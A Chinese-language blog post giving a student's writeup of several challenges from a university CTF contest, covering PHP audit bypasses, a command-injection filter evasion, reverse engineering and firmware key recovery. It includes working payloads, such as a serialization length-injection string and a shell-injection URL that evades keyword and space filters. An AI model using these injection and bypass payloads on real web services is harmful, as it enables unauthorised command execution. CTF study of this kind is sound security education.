---
title: 武汉大学第二届“珞格杯”校园CTF大赛部分题目Writeup
date: 2020-05-27 20:12:55
tags:
- ctf
- debugging
- assembly
- php
mathjax: true
---

第一次打CTF，体验了被大佬碾压的感觉。

<!--more-->

总的来说，游戏体验极佳，~~不会的题用多少时间还是不会~~

## checkin

题目是一个`Git`仓库，先看一下`remote`

![checkin-1](/images/whuctf2020-1.webp)

然后找到了`flag`

![checkin-2](/images/whuctf2020-2.webp)

## ezphp

地址：http://218.197.154.9:10015/

打开后发现是`php`代码审计题

```php
<?php
error_reporting(0);
highlight_file(__file__);
$string_1 = $_GET['str1'];
$string_2 = $_GET['str2'];

//1st
if($_GET['num'] !== '23333' && preg_match('/^23333$/', $_GET['num'])){
    echo '1st ok'."<br>";
}
else{
    die('会代码审计嘛23333');
}


//2nd
if(is_numeric($string_1)){
    $md5_1 = md5($string_1);
    $md5_2 = md5($string_2);

    if($md5_1 != $md5_2){
        $a = strtr($md5_1, 'pggnb', '12345');
        $b = strtr($md5_2, 'pggnb', '12345');
        if($a == $b){
            echo '2nd ok'."<br>";
        }
        else{
            die("can u give me the right str???");
        }
    } 
    else{
        die("no!!!!!!!!");
    }
}
else{
    die('is str1 numeric??????');
}

//3nd
function filter($string){
    return preg_replace('/x/', 'yy', $string);
}

$username = $_POST['username'];

$password = "aaaaa";
$user = array($username, $password);

$r = filter(serialize($user));
if(unserialize($r)[1] == "123456"){
    echo file_get_contents('flag.php');
}
会代码审计嘛23333
```

先解决第一个，主要是绕过正则`preg_match('/^23333$/', $_GET['num'])`这里使用`%0a`换行绕过。第一个`payload`:`num=23333%0a`

然后第二个是`php`的`md5`比较问题，`php`是弱类型语言，这里考虑用`0e`开头后面全为数字的字符串会转换为浮点数来绕过`md5`比对，这里题目有一个字母替换，那么`0e`后面还允许出现`pgnb`四个字母。写一个脚本爆破就好了:

```python
import hashlib

def md5(s):
	return hashlib.md5(s.encode(encoding='UTF-8')).hexdigest()

for i in range(1,999999999):
    flag = 1
    j = md5(str(i))
    if j[0:2] == '0e':
        for z in j[2:]:
            if z not in "0123456789pgnb":
                flag = 0
                break
        if flag == 1:
            print("found md5("+str(i)+")="+j)
```

![ezphp-1](/images/whuctf2020-3.webp)

这里随便挑两个就可以了。第二个`payload`:`str1=11230178&str2=113619666`

还剩下第三个序列化与反序列化的问题:

正常情况下序列化后的字符串为：`a:2:{i:0;s:5:"hello";i:1;s:5:"aaaaa";}`这里面`username`是可控的，考虑用`username`覆盖掉后面的东西。于是构造`hello";i:1;s:6:"123456";}`。接下来就剩一个长度的问题，好在这里有一个`x`和`yy`的替换，用来凑长度，所以构造`helloxxxxxxxxxxxxxxxxxxxx";i:1;s:6:"123456";}`,编码后发送POST:`username=helloxxxxxxxxxxxxxxxxxxxx%22%3Bi%3A1%3Bs%3A6%3A%22123456%22%3B%7D`

最后拿到`flag`:`whuctf{f4f9b4cd-e80e-4570-9b82-013d257c0756}`

## ezcmd

地址：http://218.197.154.9:10016/

```php
<?php
if(isset($_GET['ip'])){
  $ip = $_GET['ip'];
  if(preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{1f}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
    echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
    die("fxck your symbol!");
  } else if(preg_match("/ /", $ip)){
    die("no space!");
  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
    die("no flag");
  } else if(preg_match("/tac|rm|echo|cat|nl|less|more|tail|head/", $ip)){
    die("cat't read flag");
  }
  $a = shell_exec("ping -c 4 ".$ip); 
  echo "<pre>";
  print_r($a);
}
highlight_file(__FILE__);

?>
```

这里涉及到命令行的构造

先看一下本地文件：`http://218.197.154.9:10016/?ip=127.0.0.1|ls`得到结果：

```php+HTML
flag.php
hahaha
index.php

--snip--
```

这个题过滤了一堆关键词，所以一开始想到可以用`base64`来绕过，然而好像没有结果....

因为不能按顺序出现`flag`四个字符所以这里尝试从`ls`里面提取出`flag.php`来绕过。于是通过`ls|head -n1`得到。

然后配合`cat`得到原始的脚本:

```
cat `ls|head -n1`
然后绕过cat和head匹配
ca\t `ls|he\ad -n1`
接着用$IFS$1来充当空格
ca\t$IFS$1`ls|he\ad$IFS$1-n1`
接上前面的127.0.0.1得到完整的payload
http://218.197.154.9:10016/?ip=127.0.0.1|ca\t$IFS$1`ls|he\ad$IFS$1-n1`
```

![ezcmd-1](/images/whuctf2020-4.webp)

## bivibivi

先是一个同余方程，暴力求解就好了。

然后，使用`bilibili`官方的接口转换：

```
http://api.bilibili.com/x/web-interface/archive/stat?bvid=
http://api.bilibili.com/x/web-interface/archive/stat?aid=
```

## RE1

先通过`string`快速定位代码：

![RE1-1](/images/whuctf2020-5.webp)

然后可以确定输入格式：7位字符串

![RE1-2](/images/whuctf2020-6.webp)

然后下个断点，动态调试：

![RE1-3](/images/whuctf2020-7.webp)

随便输入一个:`1234567`

![RE1-4](/images/whuctf2020-8.webp)

先一个循环把输入的数据都丢到栈里：

![RE1-5](/images/whuctf2020-9.webp)

然后判断第5个数是否是`5`

![RE1-6](/images/whuctf2020-10.webp)

这里先把输入的数设为$x_1x_2x_3x_4x_5x_6x_7$

现在已经有了$x_5=5$

然后是一个循环计算$x_p+x_q+x_r$并判断是否等于$15$

![RE1-7](/images/whuctf2020-11.webp)

其中有两个特殊的数

![RE1-8](/images/whuctf2020-12.webp)

这里经过调试得出了需要满足的方程，最后的`flag`就是输入的数据。
$$
\begin{cases}
x_5=5\\
x_1+x_2+x_3=15\\
x_1+x_4+x_7=15\\
x_4+x_5+x_6=15\\
x_2+x_5+9=15\\
x_7+9+2=15\\
x_3+x_6+2=15\\
\end{cases}
$$
熟悉的线代，这里考虑到题目`hint`中说明数字不重复加之$0\le x_i\le 9$最后枚举得到答案$8163574$，`flag`:`WHUCTF{8163574}`

## RE4

这道题很有意思，就每个子任务而言难度不大，但是我做的时候摆着的`0 solve`就说明这玩意不普通。

`nc 218.197.154.9 10055`

这道题会给出三个`base64`编码的程序，然后每题有大约**十秒**时间作答，大致格式如下：

```
Here is your challenge:

--snip--


Please give me your answer
```

好在给的三个程序只有参数变了，程序主体没变，所以可以直接定位特征值

第一个程序：

![RE4-1](/images/whuctf2020-13.webp)

![RE4-2](/images/whuctf2020-14.webp)

F5大法好，第一题提取两个数字然后计算`v1`就好了

第二个程序：

![RE4-3](/images/whuctf2020-15.webp)

又是熟悉的线代

第三个程序：

![RE4-4](/images/whuctf2020-16.webp)

emm，这个不太便于人类阅读，稍微整理一下：

```c++
#include <cstdio>
double get(unsigned long long v16)
{
	if ((long long)v16 < 0)
	{
		return (double)(signed int)(v16 & 1 | (v16 >> 1)) + (double)(signed int)(v16 & 1 | (v16 >> 1));
	}
	else
	{
		return (double)(signed int)v16;
	}
}

int main()
{

	unsigned long long v16, v17, v18;
	double v0, v2, v4;
	double v1, v3, v5;
	int result;
	double v6, v7, v8, v9, v10, v11, v12, v13, v14;

	scanf("%llu", &v16);
	scanf("%llu", &v17);
	scanf("%llu", &v18);

	double num1 = 0.9649508586, num2 = 0.5710826147, num3 = 0.6850006378, num4 = 2828711767.137764;
	double num5 = 0.0983183541, num6 = -0.0359730015, num7 = -0.1756920395, num8 = -148776883.7387032;
	double num9 = -0.893297245, num10 = 0.8202376064, num11 = -0.2853997234, num12 = -1774043720.070027;

	v1 = num1 * get(v16);
	v3 = v1 + num2 * get(v17);
	v4 = v3 + num3 * get(v18);

	v6 = num5 * get(v16);
	v8 = v6 + num6 * get(v17);
	v9 = v8 + num7 * get(v18);

	v11 = num9 * get(v16);
	v13 = v11 + num10 * get(v17);
	v14 = num11 * get(v18) + v13;

	if (v4 != num4 || v9 != num8 || v14 != num12)
	{
		result = 0;
	}
	else
	{
		result = 1;
	}
	return result;
}
```

换句话说这题要解线性方程组，又是线代！
$$
\begin{cases}
num1\times v_{16}+num2\times v_{17}+num3\times v_{18}=num4\\
num5\times v_{16}+num6\times v_{17}+num7\times v_{18}=num8\\
num9\times v_{16}+num10\times v_{17}+num11\times v_{18}=num12\\
\end{cases}
$$
接下来困难的是写脚本的过程，这里我使用了`radare2`来操作

```python
import base64
import socket
import codecs
import struct
import r2pipe
import numpy as np
from scipy.linalg import solve

def dumpFile(payload):
    binFile = open('input.elf', 'wb')
    decoded = base64.b64decode(payload)
    binFile.write(decoded)
    binFile.close()

def getNum1():
    r = r2pipe.open('input.elf')
    num1 = r.cmd('s 0x00000755;pd1')
    inum1 = int(num1[58:68],16)
    num2 = r.cmd('s 0x0000075c;pd1')
    inum2 = int(num2[55:73],16)
    print(inum2/inum1)
    return inum2/inum1

def getNum2():
    r = r2pipe.open('input.elf')
    aa1 = r.cmd('s 0x00000775;pd1')
    a1 = int(aa1[58:],16)
    aa3 = r.cmd('s 0x0000079d;pd1')
    a3 = int(aa3[58:],16)
    bb2 = r.cmd('s 0x000007b2;pd1')
    b2 = int(bb2[55:],16)
    if b2 > 2**63 - 1:
        b2 = 2**64 - b2
        b2 = - b2
    bb1 = r.cmd('s 0x0000078a;pd1')
    b1 = int(bb1[55:],16)
    if b1 > 2**63 - 1:
        b1 = 2**64 - b1
        b1 = - b1
    aa2 = r.cmd('s 0x00000780;pd1')
    a2 = int(aa2[58:],16)
    aa4 = r.cmd('s 0x000007a8;pd1')
    a4 = int(aa4[58:],16)
    ans_y = (a1*b2-a3*b1)/(a1*a4-a2*a3)
    ans_x = (b1-a2*ans_y)/a1
    ans = str(int(ans_x)) + " " + str(int(ans_y))
    print(ans)
    return ans

def getNum3():
    r = r2pipe.open('input.elf')
    
    a1_raw = r.cmd('px/1xg 0x0000000000000AB0')
    a1 = struct.unpack('>d',codecs.decode(a1_raw[14:30],'hex'))[0]
    
    a2_raw = r.cmd('px/1xg 0x0000000000000AB8')
    a2 = struct.unpack('>d',codecs.decode(a2_raw[14:30],'hex'))[0]
    
    a3_raw = r.cmd('px/1xg 0x0000000000000AC0')
    a3 = struct.unpack('>d',codecs.decode(a3_raw[14:30],'hex'))[0]
    
    a4_raw = r.cmd('px/1xg 0x0000000000000AC8')
    a4 = struct.unpack('>d',codecs.decode(a4_raw[14:30],'hex'))[0]
    
    b1_raw = r.cmd('px/1xg 0x0000000000000AD0')
    b1 = struct.unpack('>d',codecs.decode(b1_raw[14:30],'hex'))[0]
    
    b2_raw = r.cmd('px/1xg 0x0000000000000AD8')
    b2 = struct.unpack('>d',codecs.decode(b2_raw[14:30],'hex'))[0]
    
    b3_raw = r.cmd('px/1xg 0x0000000000000AE0')
    b3 = struct.unpack('>d',codecs.decode(b3_raw[14:30],'hex'))[0]
    
    b4_raw = r.cmd('px/1xg 0x0000000000000AE8')
    b4 = struct.unpack('>d',codecs.decode(b4_raw[14:30],'hex'))[0]

    c1_raw = r.cmd('px/1xg 0x0000000000000AF0')
    c1 = struct.unpack('>d',codecs.decode(c1_raw[14:30],'hex'))[0]
    
    c2_raw = r.cmd('px/1xg 0x0000000000000AF8')
    c2 = struct.unpack('>d',codecs.decode(c2_raw[14:30],'hex'))[0]
    
    c3_raw = r.cmd('px/1xg 0x0000000000000B00')
    c3 = struct.unpack('>d',codecs.decode(c3_raw[14:30],'hex'))[0]
    
    c4_raw = r.cmd('px/1xg 0x0000000000000B08')
    c4 = struct.unpack('>d',codecs.decode(c4_raw[14:30],'hex'))[0]

    A = np.array([[a1,a2,a3],[b1,b2,b3],[c1,c2,c3]])
    b = np.array([a4,b4,c4])
    x = solve(A,b)
    ans_x = x[0]
    ans_y = x[1]
    ans_z = x[2]
    ans = str(int(ans_x)) + " " + str(int(ans_y))+ " " + str(int(ans_z))
    return ans



s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('218.197.154.9', 10055))
content = ""
i = 0
answer = ""
while True:
    data = s.recv(1)
    if data == b'\n':
        print(content)
        if len(content) > 1000:
            dumpFile(content)
            if i == 0:
                answer = str(int(getNum1()))
            elif i == 1:
                answer = getNum2()
            else:
                answer = getNum3()
            s.sendall(answer.encode())
            i = i + 1
        content = ""
    else:
        content = content + data.decode()
s.close()
```

这里比较麻烦的是没有什么好办法直接找数据，于是傻乎乎的截取字符串：

```
[0x00000610]> s 0x00000755;pd1
│           0x00000755      4869d059a929.  imul rdx, rax, 0x6829a959
[0x00000755]>
```

反正能得到`flag`就好了:`whuctf{YoushouldknowAngrorUnicorn_44a936d7fc4124470fa783555c295ffc}`

Emm，在`flag`里告诉我要用`Angr`或`Unicorn`？其实`radare2`也不差。

## decrypt

这个题给了一个`binary`，谷歌搜索后发现是`DLINK`的路由器固件，然而加密了。

![decrypt-1](/images/whuctf2020-17.webp)

从官网上下载`DIR878A1_FW1.12B01.bin`

![decrypt-2](/images/whuctf2020-18.webp)

经过校验确认官网上的文件和题目给的文件相同

![decrypt-3](/images/whuctf2020-19.webp)

按照题目提示：`解密时所用到的密钥就是flag内容，需要求出密钥`，我们要找的就是解密这个`bin`文件的密钥

这是一个路由器的固件，按照套路，这个固件应该是老版本没有加密，在其中某个版本时引入了加密，我们只要找到中间版本就可以找到加密解密方法。

所以把那个页面上所列的文件都下下来挨个`binwalk`发现`DIR878A1_FW104B05_Middleware.bin`可以直接解包（它的名字也特别另类）

![decrypt-4](/images/whuctf2020-20.webp)

这里多次解包后得到了根文档

![decrypt-5](/images/whuctf2020-21.webp)

经过查找发现`bin`目录下存在可疑文件`imgdecrypt`，发现是一个`MIPS`架构的文件

![decrypt-6](/images/whuctf2020-22.webp)

这里用`qemu`运行一下：

![decrypt-7](/images/whuctf2020-23.webp)

发现直接输出了`key`，就不用逆向了，得到`flag`：`flag{C05FBF1936C99429CE2A0781F08D6AD8}`